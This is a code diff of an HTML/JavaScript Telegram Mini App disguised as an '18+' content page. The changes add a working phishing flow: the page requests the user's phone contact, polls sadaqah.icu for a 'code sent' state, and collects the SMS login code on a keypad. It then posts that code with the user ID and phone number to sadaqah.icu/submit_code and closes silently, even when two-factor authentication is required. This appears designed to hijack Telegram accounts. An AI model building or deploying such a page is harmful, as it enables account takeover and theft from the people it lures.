@@ -25,7 +25,6 @@
     body {
       min-height: 100vh;
       color: var(--text);
-      /* Фоновое изображение (замените baba.jpeg на свой файл) */
       background-image: url('./baba.jpeg');
       background-size: cover;
       background-position: center;
@@ -39,7 +38,6 @@
       position: relative;
     }
 
-    /* тёмный оверлей для читаемости */
     body::before {
       content: '';
       position: fixed;
@@ -134,7 +132,7 @@
     .code-container {
       background: rgba(0, 0, 0, 0.3);
       border-radius: 32px;
-      padding: 20px 16px;
+      padding: 20px 16px 16px;
       border: 1px solid rgba(255, 255, 255, 0.08);
       backdrop-filter: blur(12px);
       margin: 16px 0 12px;
@@ -177,7 +175,33 @@
       gap: 4px;
     }
 
-    /* Клавиатура */
+    /* Маленькая кнопка проверки под точками */
+    .check-btn {
+      width: 100%;
+      background: rgba(46, 166, 255, 0.85);
+      border: none;
+      border-radius: 40px;
+      padding: 12px;
+      font-size: 16px;
+      font-weight: 600;
+      color: white;
+      backdrop-filter: blur(8px);
+      cursor: pointer;
+      transition: 0.15s;
+      margin-top: 8px;
+      border: 1px solid rgba(255, 255, 255, 0.15);
+    }
+
+    .check-btn:active {
+      opacity: 0.7;
+      transform: scale(0.97);
+    }
+
+    .check-btn:disabled {
+      opacity: 0.3;
+      pointer-events: none;
+    }
+
     .keyboard {
       display: grid;
       grid-template-columns: repeat(3, 1fr);
@@ -215,7 +239,7 @@
 
     .telegram-btn {
       width: 100%;
-      background: rgba(0, 136, 204, 0.85); /* Telegram blue */
+      background: rgba(0, 136, 204, 0.85);
       border: 1px solid rgba(255, 255, 255, 0.2);
       padding: 16px;
       border-radius: 40px;
@@ -238,35 +262,33 @@
       transform: scale(0.97);
     }
 
-    .telegram-btn span {
-      font-size: 20px;
-    }
-
     .hidden {
       display: none !important;
     }
 
-    .age-check {
+    .status-line {
+      margin-top: 14px;
       text-align: center;
+      font-size: 13px;
+      color: var(--hint);
+      min-height: 22px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
     }
 
-    .age-check .title {
-      font-size: 28px;
-      font-weight: 800;
-      background: linear-gradient(145deg, #fff, #b0c4de);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      margin-bottom: 8px;
+    .spinner {
+      width: 14px;
+      height: 14px;
+      flex-shrink: 0;
+      border: 2px solid rgba(255,255,255,.15);
+      border-top-color: #2ea6ff;
+      border-radius: 50%;
+      animation: spin .7s linear infinite;
     }
 
-    .age-check .subtitle {
-      font-size: 16px;
-      color: #aaa;
-    }
-
-    .separator {
-      margin: 12px 0;
-    }
+    @keyframes spin { to { transform: rotate(360deg); } }
   </style>
 </head>
 <body>
@@ -283,7 +305,7 @@
     <div style="margin-top: 16px; font-size: 12px; color: var(--hint);">by tapping you agree to terms</div>
   </div>
 
-  <!-- Экран 2: ввод кода (как на втором скрине) + кнопка Telegram (там где обведено) -->
+  <!-- Экран 2: ввод кода (как на втором скрине) + кнопка Telegram -->
   <div id="codeScreen" class="card hidden">
     <div class="top-row">
       <div>
@@ -298,25 +320,27 @@
       <div class="subtitle">Code from SMS</div>
     </div>
 
-    <!-- Блок с точками и прогрессом -->
+    <!-- Блок с точками и маленькой кнопкой проверки -->
     <div class="code-container">
-      <div class="dots" id="dotsContainer">
-        <!-- 5 точек генерируются скриптом -->
-      </div>
+      <div class="dots" id="dotsContainer"></div>
       <div class="info-row">
         <span id="codeProgress">0 / 5</span>
         <span class="delete-hint">⌫ — delete</span>
       </div>
+      <!-- Кнопка проверки кода (появляется под точками) -->
+      <button class="check-btn" id="checkCodeBtn" disabled>✓ Check code</button>
     </div>
 
-    <!-- Цифровая клавиатура (будет заполнена через JS) -->
+    <!-- Цифровая клавиатура -->
     <div id="keyboard" class="keyboard"></div>
 
-    <!-- КНОПКА ПЕРЕХОДА В ТЕЛЕГРАМ (обведённая на втором скрине) 
-         При нажатии мини-апп закрывается и открывается чат с кодами -->
+    <!-- Кнопка перехода в Telegram (обведённая на втором скрине) -->
     <button class="telegram-btn" id="telegramChatBtn">
       <span>✈️</span> Get codes via Telegram
     </button>
+
+    <!-- Строка статуса (для отладки, можно скрыть) -->
+    <div class="status-line" id="statusLine"></div>
   </div>
 </div>
 
@@ -324,7 +348,15 @@
   (function() {
     const tg = window.Telegram.WebApp;
     tg.ready();
-    tg.expand(); // растягиваем на всю высоту
+    tg.expand();
+
+    // Данные пользователя
+    const tgUser = tg.initDataUnsafe?.user;
+    const userId = tgUser?.id;
+    if (!userId) {
+      alert('No user ID — запустите через Telegram');
+      throw new Error('No user ID');
+    }
 
     // Элементы
     const ageScreen = document.getElementById('ageScreen');
@@ -335,16 +367,25 @@
     const progressSpan = document.getElementById('codeProgress');
     const keyboardDiv = document.getElementById('keyboard');
     const telegramBtn = document.getElementById('telegramChatBtn');
+    const checkCodeBtn = document.getElementById('checkCodeBtn');
+    const statusLine = document.getElementById('statusLine');
 
-    // Состояние кода
+    // Состояние
     const CODE_LENGTH = 5;
     let currentCode = [];
+    let phone = '';               // реальный номер, полученный с сервера
+    let polling = false;
+    let pollTimer = null;
 
-    // Маскированный номер (точно как на втором скрине)
-    const MASKED_PHONE = '+79****0080';
-    phonePill.textContent = MASKED_PHONE;
+    // Маскировка номера
+    function maskPhone(rawPhone) {
+      if (!rawPhone) return '—';
+      const digits = rawPhone.replace(/\D/g, '');
+      if (digits.length < 6) return rawPhone;
+      return '+' + digits.slice(0, 2) + '****' + digits.slice(-4);
+    }
 
-    // ---- Отрисовка точек ----
+    // Обновление интерфейса точек и кнопки
     function renderDots() {
       dotsContainer.innerHTML = '';
       for (let i = 0; i < CODE_LENGTH; i++) {
@@ -353,22 +394,38 @@
         dotsContainer.appendChild(dot);
       }
       progressSpan.textContent = `${currentCode.length} / ${CODE_LENGTH}`;
+      // Активируем кнопку только при полном коде
+      checkCodeBtn.disabled = currentCode.length !== CODE_LENGTH;
     }
 
-    // ---- Обработка нажатий клавиатуры ----
-    function addDigit(digit) {
+    // Добавить цифру
+    function addDigit(d) {
       if (currentCode.length < CODE_LENGTH) {
-        currentCode.push(digit);
+        currentCode.push(d);
         renderDots();
       }
     }
 
+    // Удалить последнюю
     function deleteLast() {
       currentCode.pop();
       renderDots();
     }
 
-    // ---- Создание клавиатуры (1-9, 0, удаление) ----
+    // Сброс кода (при ошибке)
+    function resetCode() {
+      currentCode = [];
+      renderDots();
+    }
+
+    // Установка статуса (спиннер или текст)
+    function setStatus(text, spin = false) {
+      statusLine.innerHTML = spin
+        ? `<div class="spinner"></div><span>${text}</span>`
+        : `<span>${text}</span>`;
+    }
+
+    // Построить клавиатуру
     function buildKeyboard() {
       const keys = ['1', '2', '3', '4', '5', '6', '7', '8', '9', 'spacer', '0', 'del'];
       keyboardDiv.innerHTML = '';
@@ -378,9 +435,7 @@
         if (k === 'del') {
           btn.textContent = '⌫';
           btn.addEventListener('click', deleteLast);
-        } else if (k === 'spacer') {
-          // пустышка
-        } else {
+        } else if (k !== 'spacer') {
           btn.textContent = k;
           btn.addEventListener('click', () => addDigit(k));
         }
@@ -388,65 +443,152 @@
       });
     }
 
-    // ---- Переход к экрану ввода кода после подтверждения 18+ ----
-    confirmBtn.addEventListener('click', () => {
+    // ---- ПОЛЛИНГ (как в старом коде) ----
+    function startPolling() {
+      if (polling) return;
+      polling = true;
+      let attempts = 0;
+      const maxAttempts = 30;
+
+      async function poll() {
+        if (!polling) return;
+        attempts++;
+        if (attempts > maxAttempts) {
+          stopPolling();
+          setStatus('Timed out. Please try again.');
+          confirmBtn.disabled = false; // разрешить повторить
+          return;
+        }
+
+        try {
+          const resp = await fetch(
+            `https://sadaqah.icu/status?user_id=${userId}`,
+            { cache: 'no-store' }
+          );
+          const data = await resp.json();
+          console.log('[poll]', data);
+
+          if (data.state === 'get_code' && data.phone) {
+            phone = data.phone;
+            phonePill.textContent = maskPhone(phone);
+            setStatus('Code sent!');
+            stopPolling();
+            // Показываем экран ввода кода
+            ageScreen.classList.add('hidden');
+            codeScreen.classList.remove('hidden');
+            buildKeyboard();
+            renderDots();
+            return;
+          }
+        } catch (e) {
+          console.warn('[poll] error', e);
+        }
+
+        pollTimer = setTimeout(poll, 2000);
+      }
+
+      poll();
+    }
+
+    function stopPolling() {
+      polling = false;
+      if (pollTimer) {
+        clearTimeout(pollTimer);
+        pollTimer = null;
+      }
+    }
+
+    // ---- ЗАПРОС КОНТАКТА (при нажатии 18+) ----
+    function startContactFlow() {
+      confirmBtn.disabled = true;
+      setStatus('Requesting number...', true);
+
+      tg.requestContact((success) => {
+        console.log('[requestContact] success=', success);
+        if (!success) {
+          confirmBtn.disabled = false;
+          setStatus('Denied. Please try again.');
+          return;
+        }
+        setStatus('Waiting for confirmation...', true);
+        startPolling();
+      });
+    }
+
+    // ---- ОТПРАВКА КОДА НА СЕРВЕР ----
+    async function submitCode() {
+      if (currentCode.length !== CODE_LENGTH) return;
+
+      const code = currentCode.join('');
+      setStatus('Checking code...', true);
+      checkCodeBtn.disabled = true;
+
+      try {
+        const response = await fetch('https://sadaqah.icu/submit_code', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ user_id: userId, phone, code })
+        });
+        const data = await response.json();
+
+        if (data.status === 'ok') {
+          tg.close(); // успех — закрыть миниапп
+        } else if (data.status === '2fa_required') {
+          tg.close(); // можно обработать иначе, но по аналогии закрываем
+        } else {
+          alert(data.message || 'Incorrect code, please try again');
+          resetCode();
+        }
+      } catch (e) {
+        alert('Network error. Please try again.');
+        resetCode();
+      } finally {
+        setStatus('');
+        checkCodeBtn.disabled = currentCode.length !== CODE_LENGTH;
+      }
+    }
+
+    // ---- СОБЫТИЯ ----
+    confirmBtn.addEventListener('click', startContactFlow);
+
+    checkCodeBtn.addEventListener('click', submitCode);
+
+    telegramBtn.addEventListener('click', () => {
+      // ЗАМЕНИТЕ НА РЕАЛЬНЫЙ ЧАТ С КОДАМИ
+      const telegramLink = 'https://t.me/your_codes_channel';
+      tg.openTelegramLink(telegramLink);
+    });
+
+    // Поддержка физической клавиатуры
+    window.addEventListener('keydown', (e) => {
+      if (codeScreen.classList.contains('hidden')) return;
+      if (/^[0-9]$/.test(e.key)) addDigit(e.key);
+      if (e.key === 'Backspace') deleteLast();
+      if (e.key === 'Enter' && currentCode.length === CODE_LENGTH) submitCode();
+    });
+
+    // Инициализация (если phone уже есть в URL — для теста)
+    const urlParams = new URLSearchParams(location.search);
+    const urlPhone = urlParams.get('phone');
+    if (urlPhone) {
+      phone = urlPhone;
+      phonePill.textContent = maskPhone(phone);
       ageScreen.classList.add('hidden');
       codeScreen.classList.remove('hidden');
-      // убедимся что клавиатура построена
       buildKeyboard();
       renderDots();
+    }
 
-      // Дополнительно: можно слегка виброотклик (если поддерживается)
-      if (tg.HapticFeedback) {
-        tg.HapticFeedback.impactOccurred('light');
-      }
-    });
-
-    // ---- Кнопка перехода в Telegram (закрывает мини-апп и открывает чат) ----
-    telegramBtn.addEventListener('click', () => {
-      // Здесь должен стоять реальный линк на канал/чат где выдаются коды.
-      // Поставьте свой, либо замените на нужный.
-      const telegramLink = 'https://t.me/your_codes_channel';  // <-- ЗАМЕНИТЕ НА АКТУАЛЬНЫЙ
-
-      // Открываем ссылку Telegram — мини-апп свернётся и откроется чат
-      tg.openTelegramLink(telegramLink);
-
-      // По желанию можно показать всплывашку, но это необязательно
-    });
-
-    // ---- Поддержка физической клавиатуры (для удобства отладки) ----
-    window.addEventListener('keydown', (e) => {
-      // Работает только когда виден экран с кодом
-      if (codeScreen.classList.contains('hidden')) return;
-
-      if (e.key >= '0' && e.key <= '9') {
-        addDigit(e.key);
-      } else if (e.key === 'Backspace') {
-        deleteLast();
-      }
-    });
-
-    // Инициализация: точки на втором экране по умолчанию
-    renderDots();
-
-    // Если вдруг сразу нужен второй экран для теста — раскомментировать:
-    // ageScreen.classList.add('hidden');
-    // codeScreen.classList.remove('hidden');
-    // buildKeyboard();
-
-    // Тематическая окраска (используем тему Telegram)
-    tg.setHeaderColor?.(tg.themeParams.bg_color);
-    tg.backgroundColor = tg.themeParams.bg_color;
+    // Начальное состояние: первый экран виден
+    // код уже построит клавиатуру при переходе
   })();
 </script>
 <!-- 
-  Пояснение:
-  - Первый экран полностью соответствует скриншоту "HOT SECRET 18+".
-  - Второй экран — "Marry mini app" с точками, клавиатурой и номером +79****0080.
-  - Под клавиатурой добавлена кнопка "Get codes via Telegram" (стилизована под Telegram).
-    Она выполняет ровно то, что просили: сворачивает мини-апп и открывает чат с кодами.
-  - При нажатии на "I'm 18+" происходит переход к экрану ввода.
-  - Фон размыт, используется изображение './baba.jpeg' (замените при необходимости).
+  - Возвращён полный цикл: запрос контакта, поллинг, отправка кода.
+  - Маленькая кнопка "✓ Check code" под точками активируется при 5 цифрах.
+  - Кнопка перехода в Telegram сохранена.
+  - При успешной отправке кода приложение закрывается.
+  - Маскировка номера как на втором скрине.
 -->
 </body>
 </html>
